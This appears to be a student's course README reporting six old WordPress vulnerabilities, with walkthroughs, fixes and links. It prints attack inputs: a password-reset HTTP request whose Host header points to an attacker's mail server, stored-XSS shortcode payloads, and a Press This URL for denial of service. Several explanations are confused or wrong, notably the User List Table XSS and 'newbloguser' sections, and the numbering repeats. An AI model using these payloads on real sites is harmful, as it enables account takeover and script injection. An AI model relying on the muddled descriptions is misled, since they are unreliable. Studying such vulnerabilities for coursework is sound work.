# IST_590_fall
This is for IST 590 class because my VM wouldn't work with Vagrant on a MacBookPro 2015

Project 7 - WordPress Pentesting

## Pentesting Report

<!--- For IST 590 I couldn’t get the virtual machine to build with “vagrant up” command even though I had it installed with the plug in so I was tasked with finding vulnerabilities from a WPS scan so I am tasked with reporting from Professor Rains WPS scan output. --->

Time spent: 9 hours spent in total

> Objective: Find, analyze, recreate, and document **six vulnerabilities** affecting an old version of WordPress
Table of Contents


## List of Vulnerabilities found

-[!] Title: WordPress 4.2-4.7.2 - Press This CSRF DoS

-[!] Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset

-[!] Title: WordPress 2.5-4.6 - Authenticated Stored Cross-Site Scripting via Image Filename

-[!] Title: WordPress 4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds

-[!] Title: WordPress 4.1-4.3 - User List Table Cross-Site Scripting (XSS)

-[!] Title: WordPress 3.7-4.9 - 'newbloguser' Key Weak Hashing


##Summary Report

A vulnerability is when something gets exposed by being attacked like in this case Word Press. As with open source software such as Word Press it leaves the doors open to the public who can then try to expose the critical flaws it has. 


1.  Press This CSRF DoS or CVE-2017-6814 

Affected
Vulnerability types: CSRF

 Hitory

This vulnerability was founded during a summer of pwnage even by a group who call themselves bughunters in Amsterdam. 

Summary

The Press This CSRF DoS named CVE-2017-6814 is a cross site request forgery that occurs within the “press this page” on WordPress with allows the occurance of publishing with a bookmarklet so an admin can quickly reach their admin page to edit the WordPress documents can be exposed. 


Walkthrough

This can be done by doing a denial of service attack when the admin goes to a malicious webpage by inserting a get request from the server with a 

```
/wp-admin/press-this.php?u=<URL>&url-scan-submit=Scan. 
```
Because there is no maxium amount of data the "Press This" can get anything can happen from the attack by putting in a long URL to then overload he WordPress server to overload causing a DOS shutdown.

Fix 

Install WordPress version 4.7.3 or higher
- https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/


2. Host Header Injection in Password Reset

Vulnerability types: Password Rest

Affected
WordPress versions up  4.7.4

History

Dawid Golunski discoveried this Password Reset inject into the Host header in 2017.

Summary

Host Header Injection in Password Reset or better known as CVE-2017-8295 was released in 2017 with a medium to high severity risk for WordPress. This was a zero day attack it was unknown to researches to patch when it was released. 

Because WordPress uses PHP as well as MYSQL for its database this can be attacked where an attacker can gain control of the reset password link when one resets their password. 

Walkthrough

WordPress uses untrusted data by default when a user such as an admin user tries to get a new password link to then gain access to his admin page. 
WorPress uses a SERVER_NAME variable on the server within its return path header for outgoing request. An attack can modify this varabile to a domain of their chosing therefore the $from_email is changed to go the attacks inbox instead.

Source Code
```
-----[ HTTP Request ]----

POST /wp/wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: injected-attackers-mxserver.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

user_login=admin&redirect_to=&wp-submit=Get+New+Password
```

Within the fields Return-Path all have the attacker's domain set to then return to the attack.

The attack would be allowed to intercept the password reset link and gain access to the page with the session WordPress gave in the link to change a users password. 


Fix
users can enable UseCanonicalName to enforce static SERVER_NAME value within the apache server.
- https://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname

Update to the latest version of WordPress
- https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/

3.Authenticated Stored Cross-Site Scripting via Image Filename

Affected
Vulnerability types: XSS

History

It was first saw at the Summer of Pwnage event by a group called bughunters in Amsterdam.

Summary

Authenticated Stored Cross-Site Scripting via Image Filename allows a user to make a certain kind of image which then is uploaded to WordPress injects javascript into the WordPress application server. This code within the image can then gather all types of information about the user, web server, as well as other people who are stored inside the database. This would then allow the attack to get users session id tokens to then login as that user to then do what s/he wants to do.
Walkthrough

Create an image as a jpg file and have the name set to something long but use the HTML code <img src=a onerror=XSS script here with the document.cookie > to force the web server getting the posted image to then perform this XSS script action. Then the attack would look at the image which was uploading to see what the output was such as session cookies and so on.

Souce Code
```
[caption width='1' caption='<a href="' ">]</a><a href="onmouseover='alert(1)'">
```
We know that the Post.php does not filter any thpe of shortcode for its HTML process and therefor can be exposed.


Fix
Update to the latest version of WordPress
- https://wordpress.org/news/2016/09/wordpress-4-6-1-security-and-maintenance-release/

6 Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds

Vulnerability types: XSS

Summary

Walkthrough
Any user with contributor access or even high would create a post or comment which then would load an "onload" alert XSS script to the users computers.

Souce Code
```
[embed src='https://youtube.com/embed/somethinghere onload=alert(1)\x3e'][/embed]
```
Fixed in version: 4.7.3

5. User List Table Cross-Site Scripting (XSS)

Affected

All versions up to WordPress 4.2.4

Summary

User List Table Cross-Site Scripting also known be CVE 2015-7989 occurs within a function within the WordPress called wp-includes/class-wp-customize-widgets.php in all previous versions of WordPress 4.2.4 has a time issue where attacks can expose then abuse to do a timing side channel attack 

Walkthrough

WordPress does not filter HTML code from a user supplied input. An attacker can input  scripting code to be executed by the target user's browser which the WordPress application will accept the security context of that untrusted site. This will give the attacker access to the victums cookie session. By not filtering this an attacker can execute SQL query statements into the databse itself therefore gaining access to the users WordPress if he or she is the admin. 


Fix
- https://wordpress.org/news/2015/09/wordpress-4-3-1/

6 'newbloguser' Key Weak Hashing

Affected
Vulnerability types: Hasing

Summary

CVE-2017-17091 is a Key Weak Hasing Vulnabilty allows a string to be captured directly from the user's ID including the admin. This method would allow attacks to bypass logins before entering in this string which was intended for restrition purposes only.

Walkthrough

WordPress has a file called wp-admin/user-new.php in before version 4.9.1 which sets the newbloguser key be tied to the user id number any user. One one have to inject certain code into the user-new.php file to then allow the exploit to happen.

Source Code
```
wp-admin/user-new.php
```

Fix 
Harden te user-admin.php by having it generate the user ids bg encrypting them all securely.
Update to WordPress 4.9.1
- https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/



## Assets

List any additional assets, such as scripts or files

## Resources

[WordPress Core](https://core.trac.wordpress.org/browser/)

[Press This Button](https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_press_this_function_allows_dos.html)

[Unath Password Rest](https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html)

[XSS unsafe Processing](https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vulnerability_in_wordpress_due_to_unsafe_processing_of_file_names.html)

 https://wpvulndb.com/vulnerabilities/8969
 https://github.com/WordPress/WordPress/blob/eaf1cfdc1fe0bdffabd8d879c591b864d833326c/wp-admin/user-new.php

## Notes

It was hard researching how the attacks would work with very little information because I couldn't get the Vitural Machine and running on a 2015 mac book pro. 

## License

    Copyright [2018] [of Gaylan]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
